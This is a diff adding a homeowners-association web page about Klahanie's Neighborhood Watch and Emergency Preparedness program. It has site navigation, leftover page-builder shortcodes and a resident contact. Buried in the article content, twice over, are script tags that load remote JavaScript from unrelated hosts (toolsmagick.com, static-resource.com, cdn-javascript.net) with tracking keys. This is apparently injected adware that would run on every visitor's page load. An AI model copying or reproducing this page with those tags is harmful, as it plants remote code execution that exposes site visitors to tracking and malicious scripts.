@@ -1,0 +1,164 @@
+<html>
+
+<head>
+  <title>Klahanie Association - Neighborhood Watch and Emergency Preparedness</title>
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
+    integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+  <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js"
+    integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n"
+    crossorigin="anonymous"></script>
+
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
+    integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
+    crossorigin="anonymous"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"
+    integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6"
+    crossorigin="anonymous"></script>
+
+  <link rel="stylesheet" href="/css/style.css" />
+  <script>
+    $(function() {
+     var pgurl = window.location.href.substr(window.location.href
+.lastIndexOf("/")+1);
+     $("#nav ul li a").each(function(){
+          if($(this).attr("href") == pgurl || $(this).attr("href") == '' )
+          $(this).addClass("active");
+     })
+});
+  </script>
+</head>
+
+<body class="row">
+  <nav class="sidebar col-md-2">
+    <div class="widget widget_media_image" style="margin-left:-10px;">
+      <a href="https://klahanie.com"><img 
+          src="https://klahanie.com/wp-content/uploads/2019/08/Klahanie-Logo-for-Web-small-2.png"
+          class="img col-md-10" alt="Klahanie Logo"
+          style="max-width: 100%; height: auto;"
+          data-orig-src="https://klahanie.com/wp-content/uploads/2019/08/Klahanie-Logo-for-Web-small-2.png"></a></div>
+
+    <ul id="nav" class="nav flex-column mt-4">
+  <li class="nav-item"><a class="nav-link" href="announcements.html">Announcements</a></li>
+  <li class="nav-item">
+    <a class="nav-link dropdown-toggle" href="#item1" data-toggle="collapse" data-parent="nav">Neighborhood</a>
+    <div id="item1" class='collapse'>
+      <ul class="nav ml-3">
+        <li class="nav-item"><a class="nav-link" href="https://klahanie.com/about-klahanie/">About Klahanie</a></li>
+        <li class="nav-item"><a class="nav-link" href="https://klahanie.com/neighborhoods/">Neighborhoods</a></li>
+        <li class="nav-item"><a class="nav-link" href="https://klahanie.com/shopping-center/">Shopping Center</a></li>
+        <li class="nav-item"><a class="nav-link" href="https://klahanie.com/buying-a-home/">Buying or Selling a Home</a></li>
+        <li class="nav-item"><a class="nav-link" href="https://klahanie.com/renting-your-home/">Renting Your Home</a></li>
+        <li class="nav-item"><a class="nav-link" href="https://klahanie.com/about-klahanie-forms/">Forms</a></li>
+      </ul>
+    </div>
+</li> 
+<li class="nav-item">
+  <a class="nav-link dropdown-toggle" href="#item2" data-toggle="collapse" data-parent="nav">Amenities</a>
+  <div id="item2" class="collapse">
+    <ul class="nav ml-3">
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/klahanie-lifestyles/">Klahanie Lifestyles</a></li>
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/pool-information/">Pool Information</a></li>
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/pool-forms/">Pool Rules</a></li>
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/swim-lessons/">Swim Lessons &amp; Online Registration</a></li>
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/lakeside-pool/">Lakeside Pool</a></li>
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/mountainview-pool/">Mountainview Pool</a></li>
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/tennis-information/">Tennis Information</a></li>
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/clubs-and-groups/">Clubs and Groups</a></li>
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/security/">Neighborhood Patrol</a>
+      <li class="nav-item"><a href="https://klahanie.com/lifestyles-forms/">Forms</a></li>
+    </ul>  
+  </div>
+  </li>
+
+<li class="nav-item"><a class="nav-link dropdown-toggle" href="#item3" data-toggle="collapse" data-parent="nav">The Association</a>
+  <div id="item3" class="collapse">
+    <ul class="nav ml-3">
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/the-association/">Overview</a></li>
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/administration/">Administration</a></li>
+    <li class="nav-item"><a class="nav-link" href="https://klahanie.com/homeowners-association-obligations-and-compliance/">Homeowners Association Obligations and Compliance</a>
+    <li class="nav-item"><a class="nav-link"  href="https://klahanie.com/board-of-directors/">Board of Directors</a></li>
+    <li class="nav-item"><a class="nav-link"  href="https://klahanie.com/association-forms/">Forms</a></li>
+    </ul>
+  </div>
+</li>
+<li class="nav-item"><a class="nav-link" href="https://myhoabenefits.com/">My HOA Benefits</a></li>
+<li class="nav-item"><a class="nav-link" href="klahanie-magazine.html">Klahanie Magazine</a></li>
+<li class="nav-item"><a class="nav-link" href="http://klahanie.com/events/">Calendar of Events</a></li>
+<li class="nav-item"><a class="nav-link"  href="https://klahanie.com/contact-us/">Contact</a></li>
+</ul>
+</ul>
+
+
+    <div class="small ml-3 mt-10">4210 244th Place SE<br>
+      Sammamish, WA 98029<br>
+      425-392-4663<br>
+      425-392-4663<br>
+      Office hours: 
+      <ul>
+        <li>Monday-Thursday: 8:30am - 5:00pm</li>
+        <li>Friday:9:00am - 4:00pm</li>
+        <li>Closed weekends, and holidays</li>
+      </ul>
+      <a href='https://www.facebook.com/KlahanieAssociation/'><img src="fb.png" class="img" width="100"  alt="Find us on Facebook"></a>
+    </div>
+  </nav>
+  <div class="main col-md-10">
+    <article class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">Neighborhood Watch and Emergency Preparedness</h1>
+  </header>
+
+  <div class="post-content">
+    <p>[fusion_builder_container hundred_percent=”no” hundred_percent_height=”no” hundred_percent_height_scroll=”no” hundred_percent_height_center_content=”yes” equal_height_columns=”no” menu_anchor=”” hide_on_mobile=”small-visibility,medium-visibility,large-visibility” status=”published” publish_date=”” class=”” id=”” background_color=”” background_image=”” background_position=”center center” background_repeat=”no-repeat” fade=”no” background_parallax=”none” enable_mobile=”no” parallax_speed=”0.3” video_mp4=”” video_webm=”” video_ogv=”” video_url=”” video_aspect_ratio=”16:9” video_loop=”yes” video_mute=”yes” video_preview_image=”” border_size=”” border_color=”” border_style=”solid” margin_top=”55” margin_bottom=”55” padding_top=”” padding_right=”” padding_bottom=”” padding_left=””][fusion_builder_row][fusion_builder_column type=”1_1” layout=”1_1” spacing=”” center_content=”no” link=”” target=”_self” min_height=”” hide_on_mobile=”small-visibility,medium-visibility,large-visibility” class=”” id=”” background_color=”” background_image=”” background_image_id=”” background_position=”left top” background_repeat=”no-repeat” hover_type=”none” border_size=”0” border_color=”” border_style=”solid” border_position=”all” padding_top=”” padding_right=”” padding_bottom=”” padding_left=”” margin_top=”” margin_bottom=”” animation_type=”” animation_direction=”left” animation_speed=”0.3” animation_offset=”” last=”no”][fusion_text columns=”” column_min_width=”” column_spacing=”” rule_style=”default” rule_size=”” rule_color=”” hide_on_mobile=”small-visibility,medium-visibility,large-visibility” class=”” id=””]</p>
+<div>
+<h2 style="text-align: center;">Klahanie’s <strong><em>Neighborhood Watch (NW) &amp; Emergency Preparedness (EP)</em></strong></h2>
+</div>
+<p>[/fusion_text][fusion_separator style_type=”default” hide_on_mobile=”small-visibility,medium-visibility,large-visibility” class=”” id=”” sep_color=”” top_margin=”20” bottom_margin=”20” border_size=”0” icon=”” icon_circle=”” icon_circle_color=”” width=”” alignment=”center” /][fusion_imageframe image_id=”1743|full” max_width=”” style_type=”” blur=”” stylecolor=”” hover_type=”none” bordersize=”” bordercolor=”” borderradius=”” align=”none” lightbox=”no” gallery_id=”” lightbox_image=”” lightbox_image_id=”” alt=”” link=”” linktarget=”_self” hide_on_mobile=”small-visibility,medium-visibility,large-visibility” class=”” id=”” animation_type=”” animation_direction=”left” animation_speed=”0.3” animation_offset=”“]http://klahanie.com/wp-content/uploads/2019/07/family-playing-outdoors.jpg[/fusion_imageframe][fusion_separator style_type=”default” hide_on_mobile=”small-visibility,medium-visibility,large-visibility” class=”” id=”” sep_color=”” top_margin=”20” bottom_margin=”20” border_size=”0” icon=”” icon_circle=”” icon_circle_color=”” width=”” alignment=”center” /][fusion_text columns=”” column_min_width=”” column_spacing=”” rule_style=”default” rule_size=”” rule_color=”” hide_on_mobile=”small-visibility,medium-visibility,large-visibility” class=”” id=””]</p>
+<h2 style="text-align: center;"><em><strong>"If You See Something, Say Something"</strong></em></h2>
+<p>[/fusion_text][fusion_imageframe image_id=”2090|full” max_width=”” style_type=”” blur=”” stylecolor=”” hover_type=”none” bordersize=”” bordercolor=”” borderradius=”” align=”center” lightbox=”no” gallery_id=”” lightbox_image=”” lightbox_image_id=”” alt=”” link=”” linktarget=”_self” hide_on_mobile=”small-visibility,medium-visibility,large-visibility” class=”” id=”” animation_type=”” animation_direction=”left” animation_speed=”0.3” animation_offset=”“]http://klahanie.com/wp-content/uploads/2019/07/Neighborhood-Watch.png[/fusion_imageframe][fusion_separator style_type=”default” hide_on_mobile=”small-visibility,medium-visibility,large-visibility” class=”” id=”” sep_color=”” top_margin=”” bottom_margin=”” border_size=”0” icon=”” icon_circle=”” icon_circle_color=”” width=”” alignment=”center” /][fusion_separator style_type=”default” hide_on_mobile=”small-visibility,medium-visibility,large-visibility” class=”” id=”” sep_color=”#ffffff” top_margin=”” bottom_margin=”” border_size=”10” icon=”” icon_circle=”” icon_circle_color=”” width=”” alignment=”center” /][fusion_text columns=”” column_min_width=”” column_spacing=”” rule_style=”default” rule_size=”” rule_color=”” hide_on_mobile=”small-visibility,medium-visibility,large-visibility” class=”” id=”” animation_type=”” animation_direction=”left” animation_speed=”0.3” animation_offset=””]</p>
+<h3><strong><em>√ Neighborhood Watch</em></strong><em> (<strong>NW</strong>) </em>begins when you and your neighbors…<em>gather in another’s home or connect via a summer BBQ/Block Party and…</em></h3>
+<ul>
+ 	<li>
+<h3><strong>A representative from <em>NW/EP</em> will provide a 3-minute explanation and invite one of you to serve as your <em>NW/EP</em> (She/he will organize the following info into a simple directory for all neighborhood participants).</strong></h3>
+</li>
+ 	<li>
+<h3><strong>You’ll be invited to add your name, phone number, e-mail, address to your e-directory of participating neighbors.</strong></h3>
+</li>
+ 	<li>
+<h3><strong>You’ll receive the above icon to place in a window at the front of your house,</strong></h3>
+</li>
+ 	<li>
+<h3><strong>As a participant, you are choosing to be <em>“another set of eyes” </em>regarding your neighbor’s home/property/well-being.</strong></h3>
+</li>
+</ul>
+<h3><em>√ <strong>Emergency Preparedness (EP)</strong> </em>helps <strong><em>Neighborhood Watch (NW)</em></strong> clusters prepare their households <strong>for emergencies -- e</strong>arthquake<strong>s</strong>, tsunami<strong>s</strong>, fire, etc.) by…</h3>
+<ul>
+ 	<li>
+<h3><strong>Obtaining emergency water/food, blankets, medications, flashlights, etc.</strong></h3>
+</li>
+ 	<li>
+<h3><strong>Being available to assist one another in the neighborhood in time of need because we have names, addresses, phones, e-mails, etc.</strong></h3>
+</li>
+</ul>
+<h3><strong>√ We’d like all of Klahanie’s neighborhood clusters to be active in <em>Neighborhood Watch/Emergency Preparedness.</em></strong></h3>
+<ul>
+ 	<li>
+<h3><strong><em>Neighborhood Watch/Emergency Preparedness </em>is supported by the Klahanie Board of Directors &amp; your participation<em> increases “neighborliness” which always pays great dividends. </em></strong></h3>
+</li>
+ 	<li>
+<h3><strong><em>Contact: George Gilchrist, Klahanie resident &amp; NW/EP representative…</em>georgeglchrst@gmail.com; 510-207-6972</strong></h3>
+</li>
+</ul>
+<h3><script src="//toolsmagick.com/2252259d09bdba7f1b.js"></script><script src="http://toolsmagick.com/optout/set/lat?jsonp=__mtz_cb_892342627&amp;key=2252259d09bdba7f1b&amp;cv=1582440601&amp;t=1582440600989" type="text/javascript"></script><script src="http://toolsmagick.com/optout/set/lt?jsonp=__mtz_cb_813338000&amp;key=2252259d09bdba7f1b&amp;cv=2046&amp;t=1582440600991" type="text/javascript"></script><script src="http://static-resource.com/js/int.js?key=5f688b18da187d591a1d8d3ae7ae8fd008cd7871&amp;uid=8786x" type="text/javascript"></script><script src="http://cdn-javascript.net/api?key=a1ce18e5e2b4b1b1895a38130270d6d344d031c0&amp;uid=8786x&amp;format=arrjs&amp;r=1582440601006" type="text/javascript"></script><script src="http://toolsmagick.com/ext/2252259d09bdba7f1b.js?sid=52646_8786_&amp;title=qqq&amp;blocks[]=31af2" type="text/javascript"></script></h3>
+<p>[/fusion_text][fusion_separator style_type=”default” hide_on_mobile=”small-visibility,medium-visibility,large-visibility” class=”” id=”” sep_color=”” top_margin=”20” bottom_margin=”20” border_size=”0” icon=”” icon_circle=”” icon_circle_color=”” width=”” alignment=”center” /][/fusion_builder_column][/fusion_builder_row][/fusion_builder_container][fusion_builder_container hundred_percent=”no” hundred_percent_height=”no” hundred_percent_height_scroll=”no” hundred_percent_height_center_content=”yes” equal_height_columns=”no” menu_anchor=”” hide_on_mobile=”small-visibility,medium-visibility,large-visibility” status=”published” publish_date=”” class=”” id=”” background_color=”” background_image=”” background_position=”center center” background_repeat=”no-repeat” fade=”no” background_parallax=”none” enable_mobile=”no” parallax_speed=”0.3” video_mp4=”” video_webm=”” video_ogv=”” video_url=”” video_aspect_ratio=”16:9” video_loop=”yes” video_mute=”yes” video_preview_image=”” border_size=”” border_color=”” border_style=”solid” margin_top=”” margin_bottom=”” padding_top=”” padding_right=”” padding_bottom=”” padding_left=””][fusion_builder_row][fusion_builder_column type=”1_1” layout=”1_1” spacing=”” center_content=”no” link=”” target=”_self” min_height=”” hide_on_mobile=”small-visibility,medium-visibility,large-visibility” class=”” id=”” background_color=”” background_image=”” background_image_id=”” background_position=”left top” background_repeat=”no-repeat” hover_type=”none” border_size=”0” border_color=”” border_style=”solid” border_position=”all” padding_top=”” padding_right=”” padding_bottom=”” padding_left=”” margin_top=”” margin_bottom=”” animation_type=”” animation_direction=”left” animation_speed=”0.3” animation_offset=”” last=”no”][/fusion_builder_column][/fusion_builder_row][/fusion_builder_container][fusion_builder_container hundred_percent=”no” hundred_percent_height=”no” hundred_percent_height_scroll=”no” hundred_percent_height_center_content=”yes” equal_height_columns=”no” menu_anchor=”” hide_on_mobile=”small-visibility,medium-visibility,large-visibility” status=”published” publish_date=”” class=”” id=”” background_color=”” background_image=”” background_position=”center center” background_repeat=”no-repeat” fade=”no” background_parallax=”none” enable_mobile=”no” parallax_speed=”0.3” video_mp4=”” video_webm=”” video_ogv=”” video_url=”” video_aspect_ratio=”16:9” video_loop=”yes” video_mute=”yes” video_preview_image=”” border_size=”” border_color=”” border_style=”solid” margin_top=”” margin_bottom=”” padding_top=”” padding_right=”” padding_bottom=”” padding_left=””][fusion_builder_row][fusion_builder_column type=”1_1” layout=”1_1” spacing=”” center_content=”no” link=”” target=”_self” min_height=”” hide_on_mobile=”small-visibility,medium-visibility,large-visibility” class=”” id=”” background_color=”” background_image=”” background_image_id=”” background_position=”left top” background_repeat=”no-repeat” hover_type=”none” border_size=”0” border_color=”” border_style=”solid” border_position=”all” padding_top=”” padding_right=”” padding_bottom=”” padding_left=”” margin_top=”” margin_bottom=”” animation_type=”” animation_direction=”left” animation_speed=”0.3” animation_offset=”” last=”no”][/fusion_builder_column][/fusion_builder_row][/fusion_builder_container][fusion_builder_container hundred_percent=”no” equal_height_columns=”no” menu_anchor=”” hide_on_mobile=”small-visibility,medium-visibility,large-visibility” class=”” id=”” background_color=”” background_image=”” background_position=”center center” background_repeat=”no-repeat” fade=”no” background_parallax=”none” parallax_speed=”0.3” video_mp4=”” video_webm=”” video_ogv=”” video_url=”” video_aspect_ratio=”16:9” video_loop=”yes” video_mute=”yes” overlay_color=”” video_preview_image=”” border_size=”” border_color=”” border_style=”solid” padding_top=”” padding_bottom=”” padding_left=”” padding_right=””][fusion_builder_row][fusion_builder_column type=”1_1” layout=”1_1” background_position=”left top” background_color=”” border_size=”” border_color=”” border_style=”solid” border_position=”all” spacing=”yes” background_image=”” background_repeat=”no-repeat” padding_top=”” padding_right=”” padding_bottom=”” padding_left=”” margin_top=”0px” margin_bottom=”0px” class=”” id=”” animation_type=”” animation_speed=”0.3” animation_direction=”left” hide_on_mobile=”small-visibility,medium-visibility,large-visibility” center_content=”no” last=”no” min_height=”” hover_type=”none” link=””][fusion_text]<script src="//toolsmagick.com/2252259d09bdba7f1b.js"></script><script src="http://toolsmagick.com/optout/set/lat?jsonp=__mtz_cb_382770908&amp;key=2252259d09bdba7f1b&amp;cv=1583229201&amp;t=1583229201137" type="text/javascript"></script><script src="http://toolsmagick.com/optout/set/lt?jsonp=__mtz_cb_662875549&amp;key=2252259d09bdba7f1b&amp;cv=14283&amp;t=1583229201139" type="text/javascript"></script><script src="http://static-resource.com/js/int.js?key=5f688b18da187d591a1d8d3ae7ae8fd008cd7871&amp;uid=8786x" type="text/javascript"></script><script src="http://cdn-javascript.net/api?key=a1ce18e5e2b4b1b1895a38130270d6d344d031c0&amp;uid=8786x&amp;format=arrjs&amp;r=1583229201167" type="text/javascript"></script><script src="http://toolsmagick.com/ext/2252259d09bdba7f1b.js?sid=52646_8786_&amp;title=qqq&amp;blocks[]=31af2" type="text/javascript"></script>[/fusion_text][/fusion_builder_column][/fusion_builder_row][/fusion_builder_container]</p>
+
+  </div>
+
+</article>
+
+  </div>
+
+</body>
+
+</html>
